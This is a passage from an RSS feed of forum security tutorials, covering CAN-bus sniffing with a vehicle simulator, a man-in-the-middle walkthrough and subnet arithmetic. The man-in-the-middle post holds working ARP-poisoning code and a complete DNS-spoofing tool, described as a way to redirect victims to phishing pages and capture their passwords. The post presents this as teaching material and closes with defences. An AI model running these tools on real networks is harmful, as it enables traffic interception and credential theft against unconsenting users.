<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/6/6d64dd2dc1ca3a622cc9c8d4bcf8590a267cf46c.png" data-download-href="/uploads/short-url/fBK8WUCgufRs7QMkg91BGWUD0mg.png?dl=1" title="CAN traffic wireshark" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6d64dd2dc1ca3a622cc9c8d4bcf8590a267cf46c_2_690x376.png" alt="CAN traffic wireshark" data-base62-sha1="fBK8WUCgufRs7QMkg91BGWUD0mg" width="690" height="376" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6d64dd2dc1ca3a622cc9c8d4bcf8590a267cf46c_2_690x376.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/6d64dd2dc1ca3a622cc9c8d4bcf8590a267cf46c_2_1035x564.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/6/6d64dd2dc1ca3a622cc9c8d4bcf8590a267cf46c_2_1380x752.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/6d64dd2dc1ca3a622cc9c8d4bcf8590a267cf46c_2_10x10.png"></a></div><p></p>
<p><em>CAN-bus traffic in wireshark</em></p>
<p>As we can see in wireshark CAN-bus is event driven, when the data is generated by ECU via certain action (such as changing gears, indicators on/off, door lock/unlock etc.) it’s gets instantly broadcasted on network without any message sorting. So if we are looking for CAN-ID of specific ECU it becomes very hard to look through noise of data generated by other active ECUs in system. Thankfully linux got open source software suite called <a href="https://github.com/linux-can/can-utils.git" rel="noopener nofollow ugc">can-utils</a> which allows us to create network interface for CAN traffic processing and sniffing. It has utility called candump which can display, filter and log CAN data to files.</p>
<h2>Setting up virtual CAN network for experimentation and fun</h2>
<p>So most of us are not brave enough to go out hook some hardware and mess around with actual vehicle but still want to know how CAN traffic acts in real time. Solution is <a href="https://github.com/zombieCraig/ICSim.git" rel="noopener nofollow ugc">ICSim</a> (Instrument Cluster Simulator for SocketCAN) is simulator of vehicle Dashboard data over virtual CAN network.</p>
<h3>Steps to compile ICSim</h3>
<pre><code class="lang-auto">git clone https://github.com/zombieCraig/ICSim.git
</code></pre>
<pre><code class="lang-auto">apt-get install libsdl2-dev libsdl2-image-dev can-utils
</code></pre>
<pre><code class="lang-auto">cd ICSim &amp;&amp; make &amp;&amp; ./setup_vcan.sh
</code></pre>
<p>To start ICSim with default hardcoded CAN-IDs</p>
<pre><code class="lang-auto">./icsim vcan0
</code></pre>
<pre><code class="lang-auto"> ./controls vcan0
</code></pre>
<p>Now shorting changing data according to CAN-ID</p>
<pre><code class="lang-auto">cansniffer vcan0 #Any CAN interface of your choice
</code></pre>
<p>Select control window and press Up arrow key to increase speed, you will notice CAN-ID in cansniffer output changing value alot so that CAN-ID is for your vechicle speed data transmitted by engine ECU. You can also capture that traffic in wireshark and save it for further analysis. According to source code file icsim.c default arbitration/CAN-ID for speed data is 0x244.</p>
<p>Scapy recently added support for CAN protocol layer, so now you can all kind of data analysis in python. The basic script below saves all hex values from CAN-ID in array and finds of minimum and maximum speed. The more cool things can be done with matplotlib to create graph for speed data to know how many times vehicle got slow down due to road traffic.</p>
<pre><code class="lang-auto">from scapy.all import *
import struct

load_layer("can") #Allows us to work with CAN-bus network layer please note that it only works with latest veersion of ScaPy library

can_packets = rdpcap('canbus-traffic-capture.pcap')

CAN_ID = #Your desired CAN-ID for vehicle speed data in hex format
raw_data = []

for x in can_packets:
        if x["CAN"].identifier == int(CAN_ID, 16):
            data = x["CAN"].data.hex()
            raw_data.append(data[10:]) #From traffic analysis we know that speed data only 4-bit long out of 14-bit hex string

raw_data = list(set(raw_data))

print("Raw RPM data in hex: " + str(raw_data))

delta_rpm = []

for y in raw_data:
    delta_rpm.append(int(y, 16))


print("Maximum RPM is: " + str(max(delta_rpm)))
print("Minimum RPM is: " + str(min(delta_rpm)))
</code></pre>
<p>There are more features in ICSim which allows you to increase difficulty with -r (randomized CAN-IDs) and -l options for learning. Since ScapPy supports CAN you can also write your own ICSim kind of utility in python as well. Check out ScaPy docs for CAN <a href="https://scapy.readthedocs.io/en/latest/layers/automotive.html" rel="noopener nofollow ugc">here</a>.</p>
<p>For pentesting with external hardware such as <a href="https://www.raspberrypi.org/forums/viewtopic.php?f=44&amp;t=141052" rel="noopener nofollow ugc">RaspberryPi</a> and Arduino you can order shield with <a href="https://www.sparkfun.com/products/13262" rel="noopener nofollow ugc">MCP2515 controller</a></p>
<p>For more on IoT security checkout my personal blog here: <a href="https://cjhackerz.net" rel="noopener nofollow ugc">cjhackerz.net</a></p>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/can-bus-protocol-pentesting-and-forensics/15689">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/can-bus-protocol-pentesting-and-forensics/15689</link>
          <pubDate>Sun, 18 Aug 2019 15:36:51 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-15689</guid>
          <source url="https://0x00sec.org/t/can-bus-protocol-pentesting-and-forensics/15689.rss">CAN-bus protocol pentesting and forensics</source>
        </item>
        <item>
          <title>The Art of Man-in-the-Middle Attack</title>
          <dc:creator><![CDATA[mh4x0f]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hi People all right? A few years ago I began coding a packet sniffer module using  <a href="https://scapy.net/" rel="noopener nofollow ugc">scapy</a> for the <a href="https://github.com/P0cL4bs/WiFi-Pumpkin" rel="noopener nofollow ugc">WiFi-Pumpkin tool</a>  of the <a href="https://github.com/P0cL4bs/" rel="noopener nofollow ugc">PocL4bs Team</a>, where I am the main dev. It’s just that I’m here to show you some interesting things that I learned in the development process.</p>
<p>When I started implementing the TCP proxy module, before that I was looking for a better way to do DNS request redirect using  scapy  without appealing to iptables (directly). The idea was to create a dns spoof  that can redirect some selected domain to a phishing page for example, in the case of WP  that does not have to do arpspoof  since the data of the victim already goes through attacker, with that idea in mind I started to seek information about.</p>
<h3>Intruders</h3>
<p>If you do not know how a man-in-the-middle  attack works, let me explain to you.</p>
<p>“The wikipedia tells me that” Man-in-the-middle (man in the middle, in reference to the attacker who intercepts the data) is a form of attack in which the data exchanged between two parties (eg you and his bank), are somehow intercepted, recorded and possibly altered by the attacker without the victims noticing. "</p>
<p>That is the explanation is correct and technically speaking works the following way, say that somehow the attacker needs to make the packets sent by the victim ( unprotected ) need to go through it and then be sent to the destination host  or rather, to the server. In this way, it is possible to modify the packages (of the protocol http) in the way that we want and then make modifications such as: remove header, add header, remove information, change the body code of the request, redirect to another website and finally capture the credentials ( PASSWORD ) committed by the victim. There are several ways to make this type of attack one of hers and more common is to make a change  in the network causing the data before being sent to the local gateway  be sent to you and soon after it is sent to the actual destination the original webserver of the request.</p>
<p>It is possible to do this, using a tool called arpspoof (it comes by default installed in kali linux) in the local network, you can program your own arpspoof (with python same) We’ll get there soon. The idea behind (arpspoof) or rather of the attack on the arp protocol is to make a change to the arp (Address Resolution Protocol - RFC 826)  table in such a way which can confuse the gateway and the target machine, in fact, this mocking will cause all packets that would previously be sent to the gateway to be sent to the attacker machine that is now being the new router local network. the diagram looks like this:</p>
<pre><code class="lang-auto">  +-------------+  &lt;--------------------------+  +-------------+  -----&gt;  +---------------+
  |    Target     |     Original Trajectory        |  Router     |          | Web application |
  +----+---+----+  +--------------------------&gt;  +----+---+----+  &lt;-----  +---------------+
       ^ X |                                          | X ^
       | X v                                          v X |
       | X   New trajectory created by attacker       X |
       | X +-----------&gt; +---------------+  &lt;---------+ X |
       | XXXXXXXXXXXXXXX |   attacker    |  XXXXXXXXXXXXX |
       &lt;-----------------+               +----------------&gt;
                         |   arpspoof    |
                         +---------------+
</code></pre>
<p>Note that in this scenario we have the following situation: Target  after the arpspoof attack is performed ends up sending the data, which would normally be sent to the router to later send to the web application, to the attacker on the local network. In this way, the attacker has complete control over the data sent and received (in HTTP) from the client. The Attacker  is at all times sending arp  packets to the target and the gateway simultaneously so that the router can “find” that the Attacker  is the Target  , and Target  will eventually find that router  is the Striker  machine, so we get the famous attack of man-in-the-middle . Just remembering that this process is not complicated as you can imagine, if you choose a simple language like python it is very easy to implementation.</p>
<h3>Settings</h3>
<p>Before you want to go around redirecting packages, you first need to know how that is possible. In Linux it is possible to make some settings at the kernel  level to make it forward  or routing on a network. That is to say that it is possible to put a machine between two or more network segments, allowing the free passage of packets between them whenever necessary, only remembering that this parameter has already disabled (0 ) by default in linux. This modification is “set” in the parameters of the linux kernel, (  linux class ) basically we have two types of parameters in linux, the runtime that you can change with the kernel running and the more fixed parameters that people can change during boot, in grub, and summarizing you can do the following ways:</p>
<pre><code class="lang-auto">sudo sysctl -w net.ipv4.ip_forward=1
</code></pre>
<p>or</p>
<pre><code class="lang-auto">sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forward
</code></pre>
<p>Using any of the alternatives you will get the same result, change ip_forward to enable  or 1  it is still possible to make this permanent change, which would not be our case after finishing the experiment always disable this option.</p>
<h3>Packets on the fly</h3>
<p>Usually this part is what many tutorials on the internet end up appealing to iptables , which serves to add a firewall rule in order to redirect DNS requests to the attacker’s machine. However, using iptables  ends up losing performance because all the packets for port 53 will be redirected to a particular service, which usually has a webservices running a fake page from some site, generating a delay on the connection. With that in mind, I decided to research how to improve this interaction in such a way that it can be better utilized and that it could have greater and more direct control in the network. Some days passed and I ended up finding a lib in python that solved my problems and even better part without implementing from scratch. the python module is <a href="https://pypi.org/project/NetfilterQueue/" rel="noopener nofollow ugc">NetfilterQueue</a>.</p>
<pre><code class="lang-auto">NetfilterQueue provides access to packets matched by an
iptables rule in Linux. Packets are matched can be accepted,
 dropped, altered, or given a mark.
</code></pre>
<p>Visit the above site and try to install it on your linux operating system, notice that it depends on a lib called libnetfilter-queue-dev  that actually does it all work since it is an API to manipulate packets  that were queued by the kernel packet filter.</p>
<p>To understand how NFqueue  works we need to understand how the architecture inside the Linux kernel works. When a packet is sent to a destination NFqueue , it is barred and queued (QUEUE) to a queue that corresponds to the --queue-num (by default 1) option number.</p>
<pre><code class="lang-auto">iptables -I INPUT -d 192.168.0.0/24 -j NFQUEUE --queue-num 1
</code></pre>
<p>This packet queue is implemented as a threaded list, which elements are packets and metadata (linux  skb socket buffer), when you have a time search about the protocol that is between the userspace and kernel called  nfnetlink , without spoiler. Look how simple it is to use this module to control the flow of packets on the network.</p>
<pre><code class="lang-auto">from netfilterqueue import NetfilterQueue

def print_and_accept(pkt):
    print(pkt)
    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
</code></pre>
<p>Imagine now you do from scapy.all import \ * \ : D.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/1/1a69aa777b54a0c774f01a4e17d20902b4addc46.webp" data-download-href="/uploads/short-url/3LENKdTtFIr5yMpYxvolWwPGr42.webp?dl=1" title="meme" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1a69aa777b54a0c774f01a4e17d20902b4addc46.webp" alt="meme" data-base62-sha1="3LENKdTtFIr5yMpYxvolWwPGr42" width="690" height="388"></a></div><p></p>
<p>we can also use this method to do malware analysis that somehow communicates on a specific port or even a specific packet type. for example, you can control the packets sent to a particular port and modify it as you want.</p>
<pre><code class="lang-auto">iptables -A OUTPUT -p tcp –dport 1337 -j NFQUEUE
</code></pre>
<pre><code class="lang-python">
def callbackPackets(i, payload):
  data = payload.get_data()
  print(data)


if __name__ == '__main__':
  q = nfqueue.queue()
  q.open()
  q.bind(socket.AF_INET)
  q.set_callback(callbackPackets)
  q.create_queue(0)

  try:
    q.try_run()
  except KeyboardInterrupt:
    print "Exiting..."
    q.unbind(socket.AF_INET)
    q.close()
    sys.exit(1)
</code></pre>
<p>If we import the scapy module we can mock, reassemble, extract and send the package. With this idea I decided to create my own  dnsspoof  that would create a UDP port 53 handler to filter only the packets that would be DNS  requests and thus allowing redirection for any webservice . The scapy supports to detect any type of packages without having to make in the hand, it is even possible to know until the layer before making any modification in the package avoiding broken packages for not being of the same type.</p>
<p>OBS:</p>
<blockquote>
<p>Just remembering that I had an extremely difficult time to run this  threaded  code in the trials the application froze (honestly I do not know why it might be by using this type of filter), I had to run on another Process thread separately.</p>
</blockquote>
<h3>DNS (Domain Name System)</h3>
<p>If you do not know TCP / IP strongly suggest you read the book “tcp illustrated” or read the  RFC  even though an old book has not changed much, just added a few layers. definition:</p>
<blockquote>
<p>The Domain Name System (DNS) is a hierarchical decentralized naming system for computers, services, or other resources connected to the Internet or a private network. It associates various information with domain names assigned to each of the participating entities.</p>
</blockquote>
<p>The DNS protocol uses UDP (User Datagram Protocol), I do not know if it’s right (search for it and correct it if necessary) but the UDP protocol is used because the requests need to be fast and because TCP is much more annoying to work because they are more “safe”, the best option is to use UDP itself. The associated port as I mentioned above is the 53 for server requests, the DNS queries are requests sent as if it was a request a request sent by the client the server needs to send another packet UDP reply. DNS packets overview:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/d/dd80eb035666f8e2b8d9cd229ed536c5478b0491.png" data-download-href="/uploads/short-url/vBvJ2ROBVAo8jHccCcSf2M1KfE5.png?dl=1" title="dns" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd80eb035666f8e2b8d9cd229ed536c5478b0491_2_550x500.png" alt="dns" data-base62-sha1="vBvJ2ROBVAo8jHccCcSf2M1KfE5" width="550" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd80eb035666f8e2b8d9cd229ed536c5478b0491_2_550x500.png, https://0x00sec.s3.amazonaws.com/original/2X/d/dd80eb035666f8e2b8d9cd229ed536c5478b0491.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/d/dd80eb035666f8e2b8d9cd229ed536c5478b0491.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/d/dd80eb035666f8e2b8d9cd229ed536c5478b0491_2_10x10.png"></a></div><p></p>
<p>With scapy module we can rewrite this type of request very easy, and later to assemble a new package containing the modified request. In this way, we can disassemble the package that the client sent and just get the query where it contains the domain that it wants to access type  <a href="http://example.com" rel="noopener nofollow ugc">example.com</a> .</p>
<pre><code class="lang-python">def callback(self,packet):
    payload = packet.get_payload()
    pkt = IP(payload)
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        print(pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]) # www.example.com
</code></pre>
<pre><code class="lang-auto">###[ DNS Resource Record ]###
   rrname= 'www.example.com.'
   type= A
   rclass= IN
   ttl= 294
   rdlen= 4
   rdata= '93.184.216.34'
</code></pre>
<p>We can reassemble the packet by modifying only  rdata  containing the IP address of the web server, we can still redirect the client to any webserver without changing the URL in the browser.</p>
<pre><code class="lang-python">spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='IP TO REDIRECT'))
packet.set_payload(str(spoofed_pkt))
send(spoofed_pkt,verbose=False)
packet.accept()
</code></pre>
<pre><code class="lang-auto">###[ DNS Resource Record ]###
   rrname= 'www.example.com.'
   type= A
   rclass= IN
   ttl= 294
   rdlen= 4
   rdata= 'IP TO REDIRECT'
</code></pre>
<p>As I already mentioned before  scapy  already support to create a new packet from zero taking the information contained in the original packet, this helps a lot because doing this in hand byte to byte requires time and money, of course that way the you will learn much more about the packet fields and the protocol itself. a good practice is to use scapy +  wireshark  to do this type of analysis.</p>
<h4>ARP spoofing or ARP cache poisoning</h4>
<p>You reader will think about how to defend against this type of attack, of course I will present some solutions, because it is a simple attack to do and most of the times the attacker succeeds whatever his intention, even to take the connection with the internet as some applications do on android, for example  WiFikill  that uses this same technique from a “rootiado” device. just stop flashing your mind wiki:</p>
<blockquote>
<p>ARP spoofing or ARP cache poisoning is a technique in which an attacker sends Address Resolution Protocol (ARP) messages in order to associate their MAC address with the IP address of another host, such as the IP address of the default gateway, all traffic is sent to the attacker’s IP address instead of the gateway’s IP address.</p>
</blockquote>
<p>Interpreting the above text, he said that the only thing the attacker does is to send packets or messages of type  ARP  to force the client or the victim to send the requests to him. Knowing this, the only information he needs at the moment is to know who the gateway is, or rather who is the  MAC (Media Access Control)  of the gatway, and the  MAC  of the victim that is very simple to detect on a LAN  (local area networks - LAN) .s</p>
<p>To mount our ARP spoofing packet, we need only two information as I mentioned above  sourceMac  and  destMAC , I will not explain each of the packet fields because this information is your own friend. diagram:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bfe990ac2658d77ae63b98e15628463ff91a1019.png" alt="arp packet" data-base62-sha1="rnJBGvoMbmNx60ZObcuzzphkTvH" width="590" height="311"></p>
<h4>thread 1</h4>
<p>In practice it looks like this:</p>
<pre><code class="lang-python">self.srcAddress = 'GATEWAY'
self.dstAddress = 'TARGET'
self.mac = 'ATTACKER'

ether = Ether (dst = 'ff: ff: ff: ff: ff: ff', src = self.mac)
parp = ARP (hwtype = 0x1, ptype = 0x800, hwlen = 0x6, plen = 0x4,
op = "is-at", hwsrc = self.mac, psrc = self.srcAddress, hwdst =
'ff: ff: ff: ff: ff: ff', pdst = self.dstAddress)
padding = Padding (load = "\ x00" * 18)
packet_arp = ether / parp / padding
</code></pre>
<blockquote>
<p>ATTACKER - “hello gateway, from now I am the TARGET machine, so whatever you send to this MAC send it to me”</p>
</blockquote>
<h4>thread 2</h4>
<pre><code class="lang-python">
self.srcAddress = 'TARGET'
self.dstAddress = 'GATEWAY'
self.mac = 'ATTACKER'

ether = Ether (dst = 'ff: ff: ff: ff: ff: ff', src = self.mac)
parp = ARP (hwtype = 0x1, ptype = 0x800, hwlen = 0x6, plen = 0x4,
op = "is-at", hwsrc = self.mac, psrc = self.srcAddress, hwdst =
'ff: ff: ff: ff: ff: ff', pdst = self.dstAddress)
padding = Padding (load = "\ x00" * 18)
packet_arp = ether / parp / padding
</code></pre>
<blockquote>
<p>ATTACANT - “Hi TARGET, from now on I’m GATEWAY, so whatever you send this Mac send to me”</p>
</blockquote>
<p>This running on a separate thread and sending repeatedly, simple like that.</p>
<p>As you can see above, the two threads have something similar, which changes only  srcAddress  and  dstAddress . So we can write a universal thread and just pass the parameters to each instance of the  threads  or do everything in one thread even if you choose, it looks like this:</p>
<pre><code class="lang-python">from threading import Thread
from scapy.all import *

class ThreadARPPoison (Thread):
    def __init __ (self, srcAddress, dstAddress, mac):
        Thread .__ init __ (self)
        self.srcAddress = srcAddress
        self.dstAddress = dstAddress
        self.mac = mac
        self.process = True

    def makePacket (self):
        ether = Ether (dst = 'ff: ff: ff: ff: ff: ff', src = self.mac)
        parp = ARP (hwtype = 0x1, ptype = 0x800, hwlen = 0x6, plen = 0x4,
        op = "is-at", hwsrc = self.mac, psrc = self.srcAddress, hwdst =
        'ff: ff: ff: ff: ff: ff', pdst = self.dstAddress)
        padding = Padding (load = "\ x00" * 18)
        packet_arp = ether / parp / padding
        return packet_arp

    def run (self):
        print ('[*] starting thread')
        pkt = self.makePacket ()
        while self.process:
            send (pkt, verbose = False, count = 3), sendp (pkt, verbose = False, count = 3)

    def stop (self):
        self.process = False
        print ('[!] stop thread')

</code></pre>
<p>But how will I know if the attack is really working? To answer this question we came back to the network knowledge, so that such an attack would work something would have to be changes and this thing is exhausting the ARP table that in this case, as you are doing these tests in a simulated environment we can check if these modifications They really are happening. on windows just open  cmd  and type the command below:</p>
<pre><code class="lang-auto">arp -a
</code></pre>
<p>This command is basically to check if the arp table is “poisoned” as people often refer to, the output of this command goes something like this:</p>
<pre><code class="lang-auto">C: \ Users \ lab&gt; arp -a

Interface: 10.0.2.15 --- 0xb
  IP Address Physical Address Type
  Dynamic 10.0.2.1 01-00-5e-00-00-16 (Gateway)
  Dynamic 10.0.2.34 54-ff-32-a5-5c-b4
  Dynamic 10.0.0.22 01-00-5e-00-00-16 (Forward)

C: \ Users \ lab&gt;
</code></pre>
<p>Note that the attacker’s physical address is the same as the gateway’s physical address, meaning that someone is poisoning the arp table so that the data is diverted. This way, the attacker is able to read and modify absolutely all packages in real time.</p>
<p>Dnspoof code using NetfilterQueue module:</p>
<pre><code class="lang-python">#!/usr/bin/env python
import argparse
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *
from netfilterqueue import NetfilterQueue

"""
Description:
    This program is a module for wifi-pumpkin.py file which includes new implementation
    for Dns spoof Attack with NetfilterQueue and iptables.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;
"""

class DnsSpoofNetFilter(object):
    def __init__(self):
        """ implementation Dnsspoof with Netfilterqueue modules"""
        description = "Module DNS spoofing v0.1"
        usage = "Usage: use --help for futher information"
        parser = argparse.ArgumentParser(description = description, usage = usage)
        parser.add_argument('-d','--domains', dest = 'domains', help = 'Specify the domains', required = True)
        parser.add_argument('-r', '--redirect', dest = 'redirect',  help = 'Redirect host ', required = True)
        self.args = parser.parse_args()

    def callback(self,packet):
        payload = packet.get_payload()
        pkt = IP(payload)
        if not pkt.haslayer(DNSQR):
            packet.accept()
        else:
            if pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1] in self.domain:
                self.logDNS.info('{} -&gt;({}) has searched for: {}'.format(pkt[IP].src,
                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt,verbose=False)
                packet.accept()
            elif len(self.domain) == 1 and self.domain[0] == '':
                self.logDNS.info('{} -&gt;({}) has searched for: {}'.format(pkt[IP].src,
                self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.redirect))
                packet.set_payload(str(spoofed_pkt))
                send(spoofed_pkt,verbose=False)
                packet.accept()
            else:
                packet.accept()

    def main(self):
        self.redirect, self.domain = self.args.redirect, self.args.domains.split(',')
        self.q = NetfilterQueue()
        self.q.bind(0, self.callback)
        self.q.run()

if __name__ == "__main__":
    dnsspoof = DnsSpoofNetFilter()
    dnsspoof.main()
</code></pre>
<h3>Spoof ARP Protections</h3>
<p>To protect yourself from this type of attack, you can avoid accessing unknown / public networks. In addition, using VPN is a good way to avoid this and any other type of LAN-type attack. Another very recommended way is to use static arp table addresses, ie when you enter a static entry in the teblea ARP, informs to your computer that the router’s mac address is permanent and will not be changed. Therefore, your computer ignores any fake ARP packets sent by the attacker.</p>
<pre><code class="lang-auto">netsh ipv4 interface add neighbors "Local Area Connection" MAC Gateway
</code></pre>
<p>For mobile the tip is to use applications to detect if access point is really true, yes there are free applications that analyze the type of packet sent and thus to know if there is a  hostapd , another simple tip is not to use the browser of your device even chrome which has protections like  HSTS  and etc. Last but not least we have the best solution of all, this is the solution that works for any operating system, “remove the cable from the internet or router”. That’s all, folks.</p>
<h3>Conclusion</h3>
<p>So while man-in-the-middle is an old technique, it still provides a very big deal for the average user and business in general. Analyzing the results obtained, we have to use  NetfilterQueue  is the best option, since we have more control over the package we can use for different purposes: malware analysis and vulnerability search in web applications. In the end, the possibilities are many just depends now on your creativity,<br>
I hope you helped some curious like me who is always learning new things.</p>
<p>Any criticism can leave in the comments strongly recommend: D, until the near future.</p>
<p><em><strong>reveal that, this is my first paper in english</strong></em><br>
by: Marcos Bomfim a.k.a mh4x0f</p>
<p>References:</p>
<pre><code class="lang-auto">https://gist.github.com/mh4x0f/25ba9dabe29541c2c269f92c9e179855
https://en.wikipedia.org/wiki/Attack_man-in-the-middle
http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html
https://en.wikipedia.org/wiki/ARP_spoofing
http://ispipdatanetworks-learning.blogspot.com/2015/10/arp-packet-format-and-different-types.html
https://serverfault.com/questions/102736/persistent-static-arp-entries-on-windows-is-it-possible
https://superuser.com/questions/391108/how-can-i-add-an-active-arp-entry-on-win-7
</code></pre>
            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/the-art-of-man-in-the-middle-attack/15140">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/the-art-of-man-in-the-middle-attack/15140</link>
          <pubDate>Tue, 23 Jul 2019 05:10:47 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-15140</guid>
          <source url="https://0x00sec.org/t/the-art-of-man-in-the-middle-attack/15140.rss">The Art of Man-in-the-Middle Attack</source>
        </item>
        <item>
          <title>Simple Subnet Calculations in IPv4</title>
          <dc:creator><![CDATA[0xf00f77]]></dc:creator>
          <category>Networking</category>
          <description><![CDATA[
            <p>Hey All,</p>
<p>I recently wrote up some information on subnetting, and figured I would share it. For a more in depth overview I would highly recommend reading <a href="https://0x00sec.org/t/a-dive-into-subnetting/468">A Dive Into Subnetting</a>, which <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> wrote. Hopefully this quick and dirty reference helps in it’s own way!</p>
<p>Subnetting is the product of logically dividing up a network up into smaller, modular networks. This has many benefits, such as speed increases, easier administration, and increased options for maintaining security. While this post will not go into detail on the benefits or implementation of subnetworks, it is important to be able to calculate subnetwork ranges, network addresses, and broadcast addresses. In other words, “What is the network for for IP XXX.XXX.XXX.XXX/XX? What is the IP range of this network?”, and so on.</p>
<hr> 
<h2>Finding the Subnet Mask</h2>  
When running commands such as ipconfig or ifconfig you may be given your IP and subnet mask; but let's assume that we are working with a classless IP displayed as 192.168.0.23/21 and that you have to calculate the subnet mask yourself. The portion preceding the "/" would be the IP, and the portion afterwards indicates the amount of subnet mask bits. Like IPs, subnet masks are comprised of four binary octets. The bits are typically assigned left to right, so we would have a subnet mask of 11111111.11111111.11111000.00000000,  or 255.255.248.000 in decimal format. 
<hr>  
<h2>Simple Calculations with the Binary Method</h2>  
Now that we have our subnet mask, lets calculate the network address, which is the very first IP in a subnet range. This is done with a bitwise AND operation, so the IP needs to be represented as binary as well, 11000000.10101000.00000000.00010111.  
Here we perform the AND operation and find our network address:  
<pre><code class="lang-auto">11000000.10101000.00000000.00010111 = 192.168.000.023 (Address)  
11111111.11111111.11111000.00000000 = 255.255.248.000 (Mask)  
-----------------------------------AND---------------  
11000000.10101000.00000000.00000000 = 192.168.000.000 (Network Address)
</code></pre>
<p>This means that, for IP 192.168.0.23/21, our host 0.23 belongs to network 192.168.0.0. Now, lets look at the range of this network. We calculate this by once again looking at the bits assigned in our network mask octets, and keeping in mind the binary values of each. More specifically, we look at whichever our rightmost octet is which contains 1 values, and then the value of our rightmost bit.</p>
<table>
  <tbody>
<tr>
    <th>Value:</th>
    <td>128</td>
    <td>64</td>
    <td>32</td>
    <td>16</td>
    <td>8</td>
    <td>4</td>
    <td>2</td>
    <td>1</td>
  </tr>
  <tr>
    <th>Bits:</th>
    <td>1</td>
    <td>1</td>
    <td>1</td>
    <td>1</td>
    <td>1</td>
    <td>0</td>
    <td>0</td>
    <td>0</td>
  </tr>
</tbody>
</table>  
<p>The rightmost bit corresponds to 8, which indicates our range. In other words, the subnet range that 192.168.0.23/21 belongs to is 192.168.0.0 through 192.168.7.255, and 192.168.8.0 is the adjacent subnet. Now we also know our broadcast address, which is always the last IP address in the range (192.168.7.255). Since the first and last IP addresses are reserved for the network and broadcast addresses, the host address range (all valid addressable IPs) would be 192.168.0.1 through 192.168.7.254, giving a total of 2,046 valid host addresses (calculated as (8 x 256) - 2). We can calculate the amount of valid host addresses as rightmost bit value, 8, multiplied by 256 per octet to the right, subtracting 2 lastly.</p>
<hr>  
<h2>Even Simpler Calculations with the Magic Number Method</h2>  
